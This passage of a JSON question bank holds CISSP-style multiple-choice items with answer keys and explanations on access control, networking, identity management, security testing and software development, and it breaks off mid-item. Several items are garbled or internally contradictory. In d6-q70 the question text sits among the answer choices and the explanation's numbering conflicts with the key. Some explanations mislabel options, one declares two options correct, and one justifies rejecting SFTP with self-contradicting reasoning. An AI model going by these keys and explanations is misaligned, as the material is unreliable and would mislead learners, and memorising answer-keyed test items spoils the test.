      "stem": "A system administrator was investigating an incident and found that it occurred due to incorrect file permissions. They consulted with their manager and the manager advised them to contact the user who created that file to rectify the file permission issues. What type of access control model is the business following?",
      "choices": [
        "Mandatory Access Control (MAC)",
        "Discretionary Access Control (DAC)",
        "Role Based Access Control (RBAC)",
        "Rule Based Access Control (RuBAC)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In Discretionary access control (DAC), every file or object has an owner who has the exclusive rights to grant and deny permissions to the other users/subjects. Unlike MAC and RBAC, file permissions are not centrally managed. Rule-based access control (RuBAC) is similar to configuring firewall rules, where rules are defined to allow or deny subject access to the object."
    },
    {
      "id": "d8-q44",
      "domain": "8. Software Development Security",
      "stem": "In the fast-paced gaming world, a business wants to create a game and roll it out in the market as soon as possible. Their idea and requirements are well defined, and they believe a working prototype is more important than initial planning. They hire a group of developers and game testers. The developers create an initial gaming prototype and hand it over to the testers to find any bugs in the game by playing it in real-time. Based on the feedback, developers will fix the bugs and send the amended prototype back to the testers. The business wants this process to continue until a final prototype is ready for roll-out. Which software development model is the business using? And what application testing technique are the testers following?",
      "choices": [
        "The company is using a spiral model and the testers are using fuzzing techniques to test the game.",
        "The company is using the JAD model and the testers are using white-box techniques to test the game.",
        "The company is using the RAD model and the testers are using DAST techniques to test the game",
        "The company is using the TAD model and the testers are using SAST techniques to test the game"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The company is using the RAD model and the testers are using DAST techniques to test the game. The Rapid Application Development (RAD) model is a software development process that is based on prototyping. It focuses on working prototypes instead of initial planning. This type of process is used when the objective is well-defined and narrow in nature. This is an iterative process and is often used to develop mobile applications. The testers are using dynamic application testing (DAST) techniques since they are evaluating the application in real time without having access to the source code. The Joint Application Development (JAD) model refers to the process in which the users/clients work directly with the software developers to create an application. These joint working sessions give a good understanding of the project requirements, which reduces the time spent in quality assurance and testing. There is no TAD model."
    },
    {
      "id": "d6-q66",
      "domain": "6. Security Assessment and Testing",
      "stem": "An Internet of Things (IoT) manufacturing business hires a startup to develop a custom application that lets users monitor room temperatures and send notifications on their phones. The startup firm is responsible for developing and deploying the code. Since the IoT business does not have any in-house expertise to support customer issues, they delegate these responsibilities to the startup firm. The manufacturing business wants to protect its application code in case the startup business fails to comply with its responsibilities. What type of agreement should the IoT manufacturer have in place to protect their software code?",
      "choices": [
        "Service Level Agreement",
        "Mutual Assistance Agreement",
        "Contractor Agreement",
        "Software Escrow Agreement"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A software escrow agreement is used to protect the application code in the event that the software company goes out of business or is unable to provide technical support. The agreement obligates the software company to release the application code to a third-party provider. The provider will save the code in a secure location until the relationship between the manufacturer and the software company ends. This allows the manufacturing company to maintain control over its application. Option 1, Mutual Assistance Agreements (also referred to as reciprocal agreements) are used in disaster recovery. It's an agreement between two organizations to support each other by sharing their infrastructure resources in the event of a disaster. This is rarely used in the real world since there are major drawbacks to this approach. A service Level Agreement (SLA), B, is made between the client and the service provider, stating the terms and conditions governing the services offered. A contractor agreement (3) is similar to an SLA, but it is made between the vendor and the contractor."
    },
    {
      "id": "d4-q53",
      "domain": "4. Communication and Network Security",
      "stem": "An IT department procures a firewall that will be installed between the Internet zone and the Demilitarized Zone (DMZ). The enterprise only has one public IP address assigned to it. The IT manager advises the firewall administrator to configure the firewall in such a way that all the DMZ servers should have access to the internet. Which networking concept should the administrator implement to meet the manager's requirement?",
      "choices": [
        "Routing information protocol (RIP)",
        "Virtual Private Network (VPN)",
        "Network Address port translation (NAPT)",
        "One-to-One Network Address Translation (NAT)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. NPAT enables a single external IP address to host 65,536 internal IP addresses. It does so by using different port numbers for different internal IP addresses. For example: If the assigned public IP is 1.1.1.1 and we have two different internal hosts that want internet access (Computer A - 10.0.0.1 and Computer B- 10.0.0.2) then NPAT will assign a dedicated port to each computer and will save that data in the firewall's memory table until the session is closed. Computer A : 10.0.0.1: 9090 <–> 1.1.1.1 Computer B : 10.0.0.2 – 9091 <–> 1.1.1.1 Traffic coming via port 9090 will be re-directed to computer A and traffic received on port 9091 will go to computer B. One-to-One NAT (4) assigns a single public IP address to a single host. Since the organization only has 1 public IP address and multiple internal hosts, it cannot use 1-to-1 NAT. RIP (1) is a routing protocol used to route IP packets between different networks. A VPN (2) is a secure communication channel established over an untrusted network to transmit information between different entities, it does not offer a network or port translation service."
    },
    {
      "id": "d5-q55",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A Military enterprise has built a facility to test their new weapons. They have implemented biometric scanning at each access door. On a sensitivity scale of 1-20, the Crossover rate (CER) is set to 10. Given the sensitivity of the operation, the military wants to avoid false positives. Which option is the best way to enforce physical security?",
      "choices": [
        "Decrease the CER",
        "Increase the Equal error rate (EER)",
        "Increase the sensitivity of the system",
        "Decrease the sensitivity of the system"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Crossover error rate (CER) and Equal error rate (EER) are used interchangeably, and they cannot be changed by the customer. If you want to change the CER/EER, then you will have to buy a new biometric system. As per the CER graph in the CISSP study guide, increasing the sensitivity of the system will reduce the false acceptance rate (FAR), or 'type 2 errors', but will increase the false rejection rate (FRR), type 1 errors. In the preceding scenario, the organization wants to reduce false positives. This means the FAR should be less, hence they should increase the sensitivity of the system."
    },
    {
      "id": "d8-q45",
      "domain": "8. Software Development Security",
      "stem": "A software business hires a consultant to evaluate their existing software processes and help them get to the next stage of the Software Capability Maturity Model ( SW-CMM) model. Their goal is to have a basic lifecycle management process in place so that they can reuse the code in an organized fashion. In which state of SW-CMM is the software business currently operating?",
      "choices": [
        "Repeatable",
        "Initial",
        "Defined",
        "Managed"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The software company is currently operating in the \"Initial\" stage of the SW-CMM model. The initial stage is also called the ad-hoc stage, where the processes are not yet defined, and everyone is working individually as per requirements. The repeatable stage (1) is where the basic lifecycle management process is defined. Codes are re-used in an organized fashion to re-create the same result. The defined stage (3) is where a formalized process is documented, and software developers are expected to follow those standards and procedures. The managed stage (4) is where quantitative metrics are developed to verify if objectives are being met by the defined processes."
    },
    {
      "id": "d3-q59",
      "domain": "3. Security Architecture and Engineering",
      "stem": "The senior management of a government agency that maintains sensitive data of national interest recently received an alarming risk assessment report. Employees have been negligently conversing and discussing sensitive and confidential data on the phone with field officers and stakeholders in their office spaces, escalators, and staircases. Which option will be the MOST appropriate physical security control to address the concern?",
      "choices": [
        "Establishing communication Channel Encryption",
        "Establishing robust access controls",
        "Establishing a sensitive compartmented information facility (SCIF)",
        "Delivering security awareness training"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Sensitive compartmented information facility (SCIF) is an isolated and restricted space designed for conducting confidential discussions. SCIF controls are therefore the best method to address work area security challenges. Even though \"security awareness training\" (4) may appear the best option, the question primarily refers to the physical security domain, and SCIF is the best choice in this instance because you cannot replace the requirement for a \"perimeter wall\" with security awareness training programs. Establishing communication encryption and access controls (A and B, respectively) are technical controls and will have little to do with the insider threat outlined in the scenario. Security awareness training is the second most appropriate control to enhance the behavior of employees after establishing restricted work area security."
    },
    {
      "id": "d3-q60",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A detective working in a federal prosecution department has 'Top Secret' security clearance within the enterprise. Moreover, they have been involved in a classified investigative case labeled 'Secret' with an Officer who has a 'Confidential' security clearance. While the Officer can add findings, the detective cannot append any data to the case under probe. What principle of the Bell-LaPadula model would BEST meet the described scenario?",
      "choices": [
        "Simple Security Principle",
        "Star Security Property",
        "Discretionary Security Property",
        "Start Integrity Property"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The statement outlined in the scenario fits with the rule of star security property (*star property) of the Bell-LaPadula model, which prohibits subjects with a given security clearance from writing to objects beneath their clearance level (\"No write down\"). The simple security principle, on the other hand, is an access rule that blocks subjects with lower clearance from reading objects at higher levels of clearance (\"No read up\"). In discretionary security property, subjects gain access to objects based on an access matrix. Start integrity property is a Biba model's rule and deals with integrity issues. It is not an appropriate model to address confidentiality issues as demonstrated in the scenario."
    },
    {
      "id": "d5-q56",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Platforms such as Google, Facebook, and LinkedIn allow you to log in to websites of your choice without sharing your credential with third parties. This will help you to gain access to sites without actually creating accounts on each platform you might be interested in accessing. The platforms leverage Identity as a Service (IDaaS) with third parties by sharing certain information about your account but without exposing and sharing your credentials. Which option PRIMARILY enables the login and access mechanism demonstrated in the scenario?",
      "choices": [
        "Open ID Connect (OIDC)",
        "Open Authorization (OAuth)",
        "Security Assertion Markup Language (SAML)",
        "Single Sign-On (SSO)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Open Authentication (OAuth) primarily enables access through secure access delegation. Open ID Connect (OIDC) and OAuth are very complementary standards but OIDC functions on top of OAuth to provide authentication services to dependent parties (customers) and therefore option 1 is incorrect. Security Assertion Markup Language (SAML) is a secure framework for exchanging identity and credential information among cooperating organizations. Single Sign-On (SSO) is an access control property that authenticates users to gain access to multiple related applications using a single credential."
    },
    {
      "id": "d5-q57",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "ABC PLC works in collaboration with XYZ Limited on many projects. Moreover, they want to allow users of each business to gain access to centralized systems, applications, and resources to facilitate their work. Besides, users will not be required to create an account in each business to gain access to the shared resources. They will be simply granted access to the shared systems using a single set of credentials. This will reduce user administration and provisioning overheads and will enable the companies to focus on their business functions. What best meets the requirements outlined in the scenario?",
      "choices": [
        "Managed Security Services Provider (MSSP)",
        "Identity as Service (IDaaS)",
        "Single Sign-On (SSO)",
        "Federated Identity Management (FIM)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Federated Identity Management (FIM) enables different organizations to grant access to systems and applications through a single credential. FIM will extend the Single Sign-On (SSO) concept beyond a single organization, whereas SSO is applicable to authenticating entities and related applications within a single organization. Identity as Service (IDaaS) is a subset of federated identity management. Managed Security Service Provider (MSSP) focuses on providing security functionalities to organizations as a service."
    },
    {
      "id": "d5-q58",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Priya’s business recently decided to authenticate its employees through Multi-Factor Authentication (MFA) techniques before permitting access to its sensitive organizational data. Which option BEST meets the new requirement?",
      "choices": [
        "Smartcard, token, fingerprint",
        "Password, PIN, smartcard",
        "Retina scan, token, fingerprint",
        "Smartcard, fingerprint, password"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Unlike single- and two-factor authentication methods, MFA employs two or more authentication factors. Only option 4 precisely reflects something you know (password), something you have (smartcard), and something you are (fingerprint) factors. Authentication factors help organizations to develop hard-to-break security controls and multifactor authentication is a desirable technique to safeguard assets."
    },
    {
      "id": "d6-q67",
      "domain": "6. Security Assessment and Testing",
      "stem": "Soori, the newly crowned Chief Information Security Officer (CISO) of ABC Limited, is worried about a report of suspicious traffic to the business’s web applications. Moreover, he decided to hire a penetration testing business to evaluate the effectiveness of the security controls in place and further decided to share no information with the testers. What is the most appropriate option to undertake the test?",
      "choices": [
        "White-box testing",
        "Black-box testing",
        "Gray-box testing",
        "Blue-box testing"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Black-box testing is a type of testing in which the tester conducts the test procedure with zero knowledge of the environment under consideration. The testers depend on reconnaissance, banner grabbing, and other techniques to gather information for further exploitation. This test is the most realistic and effective method to discover and exploit vulnerabilities. However, it may cause unintended interruption to the business. Whereas white-box testers have complete knowledge of the environment, gray-box testing is undertaken based on partial knowledge of the platform to be tested. Since there is no category of testing dubbed blue-box testing in penetration testing, it is an incorrect option."
    },
    {
      "id": "d8-q46",
      "domain": "8. Software Development Security",
      "stem": "Brook is an application security engineer working in XYZ PLC. He makes sure that all applications are thoroughly tested for vulnerabilities to things such as buffer overflows, SQL injection, session hijacking, and related attacks before those applications are deployed in production environments. Despite such stringent measures, one particular customer reported a serious buffer overflow incident on its e-commerce application. The BEST remedy against the buffer overflow attack would have been _____________?",
      "choices": [
        "A robust security awareness program",
        "Proper input validation",
        "Secure coding standards",
        "Address Space Layout Randomization (ASLR)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Buffer overflow happens due to memory size overrun and the best method to avoid the attack will be to validate all input values. A security awareness program is the second best control to address this attack. Secure coding standards are an important component of software development, but they are not the primary method to contain this type of attack. Since a buffer overflow attacks the memory-addressing scheme, randomizing the addressing will help to minimize the attack a great deal but is a secondary technique."
    },
    {
      "id": "d4-q54",
      "domain": "4. Communication and Network Security",
      "stem": "Robert is a hacker and recently discovered a Wi-Fi hotspot belonging to the XYZ PLC network in his neighborhood. He changed his MAC address to one of the host’s MAC addresses on the network to launch successive attacks. He began the attack by exploiting one of the switches in the network, registered his spoofed MAC address in the CAM table of the switch, and launched MAC flooding attacks. Furthermore, he kept sending gratuitous ARP messages to each host and successfully updated the ARP table of the hosts with his new MAC-to-IP address binding. With this new binding, he successfully launched an ARP poisoning attack on the hosts of the network. What will be the next MOST likely attack?",
      "choices": [
        "Domain Name System (DNS) poisoning",
        "Meet-in-the-middle attack",
        "Replay attack",
        "Man-In-The-Middle (MITM) attack"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. This is because, after a successful Address Resolution Protocol (ARP) poisoning attack, Robert will most likely launch a Man-In-The-Middle (MITM) attack and act as a middleman to sniff each packet passing through the network. Domain Name System (DNS) poisoning is an attack that occurs by supplying bogus information to the DNS cache. Nevertheless, this kind of attack cannot happen immediately. A replay attack is a process of retransmitting captured communication sessions with the hope of gaining unauthorized access to systems. Meet-in-the-middle is a particular encryption algorithm attack that commonly uses two rounds of encryption processes and it is, thus, an incorrect option."
    },
    {
      "id": "d6-q68",
      "domain": "6. Security Assessment and Testing",
      "stem": "As a part of penetration testing, a tester is conducting targeted phishing attacks against your enterprise. The email impersonates an alert generated by the monitoring system. When a user clicks the link, they are redirected to a web page that looks exactly like your business’s collaboration software's login page. The tester wants to capture users’ credentials to access the business’s resources and then elevate their privileges. The tester is in the ___ PHASE of the penetration process?",
      "choices": [
        "Planning",
        "Reporting",
        "Information gathering",
        "Attack"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The penetration tester is in the attack phase of the penetration process. This is the third phase in the penetration process, wherein the tester is trying to exploit the vulnerability found within the system. In this scenario, the tester did the planning and gathered information by understanding the organization’s monitoring system and cloning their Office 365 web page. The tester plans to send spoofed emails to the employees to gather their credentials and elevate their privileges to gain administrative access. Planning is the first phase of penetration testing. Security personnel from the organization and the tester identify the systems to be targeted and plan the scope of the project. Information gathering is the second phase in the penetration process. The attacker tries to find information about the target by scanning the external network using tools such as Network mapper (Nmap) or by capturing publicly available information from social networking sites to plan an attack against the organization. Reporting is the last stage of the process, and it includes documenting the attack and recommendations to improve the security posture. This confidential report must be delivered securely."
    },
    {
      "id": "d6-q69",
      "domain": "6. Security Assessment and Testing",
      "stem": "XYZ Technology is looking to purchase cloud services from a local Cloud Service Provider (CSP). The business is planning to migrate its customer database to the cloud and wants to make sure the CSP has good security controls in place to protect customer data. Which DOCUMENT should the business request from the CSP that shows the effectiveness of the security controls over a period of six months?",
      "choices": [
        "Service Level Agreement (SLA)",
        "Service Organization Control (SOC) 2-Type 1 report",
        "Service Organization Control (SOC) 2-Type 2 report",
        "Security audit report"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A Service Organization Control (SOC) 2-Type 2 report showcases the effectiveness of an organization’s security and privacy controls over a given period of time. These reports are requested by the organization and evaluated by the security personnel prior to using the provider’s services. These reports are confidential and handed to the clients after signing a Non-Disclosure Agreement (NDA). SOC 2-Type 1 reports are similar to SOC 2-Type 2 reports except that they showcase the effectiveness of security controls at a specific point in time. In other words, SOC 2-Type 1 reports assess the design of the security process at a specific time. A Service Level Agreement (SLA) defines the contractual terms agreed upon between the client (XYZ Technology in this case) and the Cloud Service Provider (CSP). These terms usually mention system uptime and any penalties for violating the SLAs. Security audit reports are generated by auditors after doing security audits. Although these reports evaluate the existing security controls against the best practices, they do not showcase the effectiveness of the security controls. These reports are for internal use and are not shared with an outside organization."
    },
    {
      "id": "d4-q55",
      "domain": "4. Communication and Network Security",
      "stem": "The network administrator, Mei, working on a high-security network, is troubleshooting slow network issues using MFA-protected NMS software. Mei receives a call from the Data Center team requesting her to join a meeting. Upon entering the meeting room, which is located in a separate building, Mei re-connects with the new network and finds herself logged out of the NMS application. What was the MOST probable reason behind considering such a security design principle?",
      "choices": [
        "The disruption was a result of a routine network interruption issue due to a change in the network.",
        "Location-aware continuous re-authentication.",
        "Domain separation.",
        "Fail-close configuration."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct since continuous re-authentication is enforced when the user or entity changes context, moving from a low-trust zone (IT network) to a high-trust zone (data center). Option 1 is incorrect. The logoff condition still requires a valid IP connection, which cannot happen without a live IP connection to the network. Option 3 is incorrect. Although partially correct, this principle on its own is not enough unless it is paired with authentication and access controls. Option 4 is not correct since a fail-close configuration is a security design feature more suited for controls such as firewalls, allowing devices to fail securely."
    },
    {
      "id": "d4-q56",
      "domain": "4. Communication and Network Security",
      "stem": "As a SIEM engineer, Nozomi is investigating a new SIEM technology. It claims to use port mirroring to analyze all the PCAP traffic coming from the network. Since this feature can affect attack visibility and monitoring, what is the DRAWBACK of implementing it?",
      "choices": [
        "It can cause a loss of packets due to software issues.",
        "The network switch can be compromised.",
        "Vendor support and configuration.",
        "Mirroring can be disabled by an attacker."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct since the loss of packets is a common downside. The backplane of a switch gets saturated due to the high packet rate. Moreover, mirroring is the lowest priority function for switches, which could result in a dropped packet rate, thus making visibility ineffective. A more viable option is to use a dedicated network tap connected with a high-speed network traffic analyzer optimized for data center traffic. Option 4 is also correct since an attacker with administrative access can disable this function, resulting in a drop in security visibility by SIEM systems. Option 2 is not correct as a mirror is a one-way copy of traffic sent to a port for traffic analysis. Option 3 is incorrect, as nearly all vendor switches support mirroring configuration."
    },
    {
      "id": "d4-q57",
      "domain": "4. Communication and Network Security",
      "stem": "Yauta joined as a network security engineer and is a part of the PCI-DSS compliance team, which reviews network design for segmentation based on information classification type. Which basic network design configuration will be the MOST cost-effective way of achieving compliance with the standard?",
      "choices": [
        "Virtual Private Network",
        "802.1x authentication",
        "A border router with advanced ACLs based upon different user IP and port information.",
        "Physically segregated network infrastructure"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct since a dedicated infrastructure provides the most trusted security design for PCI-DSS scope systems. Option 1 is not correct as a VPN is an encrypted tunnel from one end of a connection to another, not a network design. Option 2 is not correct since the protocol provides authentication for devices and is not necessarily considered as segregation based on information type. Option 3 is not correct since the complexities involved in managing ACLs can be a source of misconfiguration risk and can also cause a loop in network traffic flow."
    },
    {
      "id": "d4-q58",
      "domain": "4. Communication and Network Security",
      "stem": "Linda is the network administrator of a large multinational pharmaceutical business. She manages daily configuration backups of 20 different firewalls from various vendors who use Trivial File Transfer Protocol (TFTP) servers from regional headquarters located all over the world. A recent audit has raised an objection against the use of an insecure protocol. To make the backups more secure, which is the MOST secure and privacy-friendly design option Linda can use to provide end-to-end encryption?",
      "choices": [
        "Connect the remote offices using a virtual data link over frame relay.",
        "Connect to a TFTP server using a host-to-host IPsec tunnel.",
        "Use SFTP instead of TFTP.",
        "Tunnel TFTP over SSH connections."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct since this design is secure and ensures privacy as IPsec hides the identity of the underlying message. Option 1 is incorrect. Though it provides encapsulation, it is neither secure nor private unless used with IPsec. Option 3 is not correct as it is secure but is not prone to traffic analysis due to the transfer of unencrypted header information on the wire. Option 4 is not correct as managing various key pairs (pub/priv) for different servers can become a key management issue and is prone to misconfiguration."
    },
    {
      "id": "d4-q59",
      "domain": "4. Communication and Network Security",
      "stem": "The Chief Finance Officer (CFO) of an established business is concerned about addressing a recent threat. The Finance team was found responding to fake invoices from spoofed or illegitimate entities. The IT team is given one week to come up with a cost-effective technical control to address the risk without causing any inconvenience to its valuable clients. What control can BEST protect recipients from such threats?",
      "choices": [
        "Pretty Good Privacy (PGP)",
        "Secure Multipurpose Internet Mail Extention (S/MIME)",
        "Privacy Enhanced Mail (PEM)",
        "Sender Protection Framework (SPF)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. SPF is an email authentication protocol that is used to validate the sender by allowing only selected mail servers to send an email to your domain. Option 1 is incorrect. Although PGP is secure, its implementation adds to the complexity of the secure key management of various keys such as public keys, private keys, and passphrase-based symmetric keys. Option 2 is not correct as S/MIME requires an additional mechanism for the exchange of public keys. Since it is possible to transmit the public key directly to the relevant contacts, it can also be uploaded to an external key server. Option 3 is not correct since the PEM file format is used for storing and sending cryptographic data."
    },
    {
      "id": "d5-q59",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A recent break-in incident at the business's warehouse facility where the emergency backdoor was breached is being investigated. The warehouse employs 24/7 security guards with a guard dog on all front gates. What control combination do a guard dog and a security guard APPLY to?",
      "choices": [
        "Physical and compensating.",
        "Physical and detective",
        "Physical and deterrent.",
        "Physical and preventive."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct as security guards have the ability to inspect, review, and stop the attack as it happens. Option 1 is not correct as compensating controls can exist in the absence of main or primary controls. Option 2 is incorrect, as the dog and security guard together act as preventive controls. Option 3 is not correct since deterrent controls comprise either CCTV or a guard dog if they're acting alone."
    },
    {
      "id": "d5-q60",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During an audit of administrator rights on a critical client Customer Relationship Management (CRM) system, the auditor, Bandele, raised an concern related to tampering with audit logs due to a lack of accountability. The ABSENCE of which security control can give rise to such a risk?",
      "choices": [
        "Segregation of Duties (SoD) for audit and admin privileges",
        "Unique access cards for all employees",
        "Account review as a detective control.",
        "User account reconciliation. Restricting passwords from getting shared"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct as without separating the two roles into different accounts, the administrator can delete, remove, or tamper with records of their activities, also making accountability difficult. Option 2 is incorrect. Although it is a physical security risk, it cannot directly compromise audit logs. Option 3 is incorrect. Account reviews are detective and reactive and don’t by themselves prevent such risks. Option 4 is not correct as credential sharing can have a valid business justification and is not the main source of this risk."
    },
    {
      "id": "d5-q61",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Lubanzi, the new CTO, is recommending the use of a decentralized access control model to improve the security compliance posture due to inconsistencies in security control administration. Hanspreet, the network manager, objects to the idea as the new change will degrade the quality of the service and user experience. Which option is the MOST important aspect to understand for evaluating the model's effects on the current organizational culture?",
      "choices": [
        "List of improperly configured accounts in IT systems.",
        "KPI-based IT service reporting based upon accountability and user rights/permissions.",
        "Ease of change-management tasks.",
        "Low-maintenance cost of managing a centralized control."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct as true transparency and visibility into individual department actions get diluted in layers of hierarchies and reporting structures. The core objective of the centralized model is to make user and role governance easy and transparent. Option 1 is not correct as centralized access control models have better credential and account management due to the lack of synchronization and integration issues that come with decentralized control. Option 3 is not correct since with centralized access control, change administration becomes easy and less complex but is not a major benefit. Option 4 is incorrect. The ROI of a model is a secondary consideration and less critical in terms of cultural adoption 1spects such as behavior and norms, which are mostly non-technical matters."
    },
    {
      "id": "d4-q60",
      "domain": "4. Communication and Network Security",
      "stem": "Ashley, the business owner, bought a coffee shop inside a mall. She is renovating the infrastructure and wants to provide free guest Wi-Fi to her customers. She wants the Service Set Identifier (SSID) to be available only inside her shop to prevent other shop owners and their customers from using or attacking the guest Wi-Fi. What TECHNOLOGY should she implement to meet her objective?",
      "choices": [
        "Isolate the guest network using a Virtual Local Area Network (VLAN).",
        "Implement a captive portal.",
        "Implement an air gap.",
        "Install a Faraday cage."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A Faraday cage is an enclosure that prevents electromagnetic radiation from entering or exiting the enclosed area. This will prevent the Wi-Fi signal from exiting the room and isolate it within the coffee shop. This will also reduce the electromagnetic interference with other signals from the mall, thus increasing the signal strength inside the shop. Isolating the guest network using a Virtual Local Area Network (VLAN) is a good security practice, but it will not prevent the Wi-Fi signals from being broadcast outside the coffee shop. Captive portals are used to enhance the security of the guest network. Guests connecting to the network must enter their basic personal information and agree to terms and conditions before connecting to the network. Although it increases security, it will not help Ashley to meet her objectives. An air gap is used to isolate a computer or a network from the internet. This is like disconnecting the computer from the internet by disabling the Network Interface Card (NIC). Disconnecting the internet from the guest’s Wi-Fi will not prevent it from being broadcast."
    },
    {
      "id": "d6-q70",
      "domain": "6. Security Assessment and Testing",
      "stem": "A business procures an automated penetration testing tool to perform penetration tests regularly to identify control gaps. The results are reviewed by the security team and the security control gaps are remediated in a timely manner?",
      "choices": [
        "Security testing",
        "Which COMPONENT of the security assessment program is the company focusing on?",
        "Security control review",
        "Security assessment"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The three major components of a security assessment program are security testing, security assessment, and security audits. Option 3 is correct because security testing is performed to verify whether the controls are functioning properly. These tests can be penetration tests or manual security control reviews. Option 1 is not correct because security control review is not part of a security assessment program. Although the scenario describes a control review, it is not the correct option. Option 2 is not correct because security assessment is a complete review of systems, applications, and other environments. The trained security personnel usually performs this assessment, and it usually involves a risk assessment, security testing, and a thorough review of current and future risks to the organization. Option 4 is not correct because security audits are performed to evaluate the effectiveness of security and are usually performed by internal, external, or third-party auditors. The findings are presented to management directly."
    },
    {
      "id": "d4-q61",
      "domain": "4. Communication and Network Security",
      "stem": "A homeowner buys a smart thermostat that is used to control the home temperature. The thermostat connects to the phone using Bluetooth and requires a 4-digit pin code to authenticate. After a month, the homeowner received the energy bill and discovered that the home temperature increased during the nighttime—while his family was asleep—and returned to normal during the daytime. He suspects that someone is remotely connecting to the thermostat and changing the temperature. What kind of ATTACK is the attacker conducting?",
      "choices": [
        "Bluejacking",
        "Bluesmacking",
        "Bluesnarfing",
        "Bluebugging"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Bluebugging allows an attacker to take remote control of your device over a Bluetooth connection. The attacker does so by pairing his system to the target device and creating a backdoor. Once the backdoor is created, the attacker can exploit vulnerabilities like remote code execution and privilege escalation. In this scenario, the attacker gained access to the homeowner’s cellphone and changed the temperature while they were asleep. Bluesnarfing is a network attack where the attacker connects to the target device using Bluetooth and gains access to confidential data like email or photos. Bluesnarfing is also possible when the target device’s Bluetooth is off. In that case, the attackers connect to the device using Bluetooth’s MAC address. Bluesmacking is a Denial of Service (DoS) attack on the target device. The attacker does this by sending irrelevant traffic over the Bluetooth connection making it impossible for the user to use their device. In bluejacking, the attacker sends an unsolicited message to the target device using a Bluetooth connection. The messages can appear on the screen automatically without the owner’s consent."
    },
    {
      "id": "d4-q62",
      "domain": "4. Communication and Network Security",
      "stem": "An Internet Service Provider (ISP) has branch offices in different regions connected to its head office. The branches function as independent Autonomous Systems (ASs) and connect to the head office through the internet. Each branch has its own Autonomous System Number (ASN) and serves customers in the respective regions. Which option is the MOST LIKELY protocol demonstrated in the scenario?",
      "choices": [
        "Routing Information Protocol (RIP)",
        "Border Gateway Protocol (BGP)",
        "Internetwork Packet Exchange (IPX)",
        "Open Shortest Path First (OSPF)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. BGP is a path vector routing protocol that connects separate Autonomous Systems (ASs) of service providers and is the most scalable routing protocol. Option 1 is not correct because RIP is a routing protocol that uses the hop count to determine the best path to a remote network. Though it works well in interior networks, it does not work in interconnect exterior networks such as different ASs. Option 3 is not correct as IPX is a non-IP network and routed protocol used in telephony systems but not to connect ASs. Option 4 is not correct because OSPF is a link-state routing protocol used to connect interior networks within an enterprise but not ASs."
    },
    {
      "id": "d1-q80",
      "domain": "1. Security and Risk Management",
      "stem": "An e-commerce business plans to buy a Distributed Denial of Service (DDoS) protection service worth $240,000 for three years to protect its website. The business’s financial document indicates that the website’s asset value is $700,000. The business experiences DDoS attacks every month that lower the profit margin by one percent. What is the Annual Loss Expectancy (ALE), and should the business BUY the DDoS protection service?",
      "choices": [
        "ALE = $1,008,000 and the company should not buy the DDoS protection service.",
        "ALE = $84,000 and the company should buy the DDoS protection service.",
        "ALE = $84,000 and the company should not buy the DDoS protection service.",
        "ALE = $1,008,000 and the company should buy the DDoS protection service."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
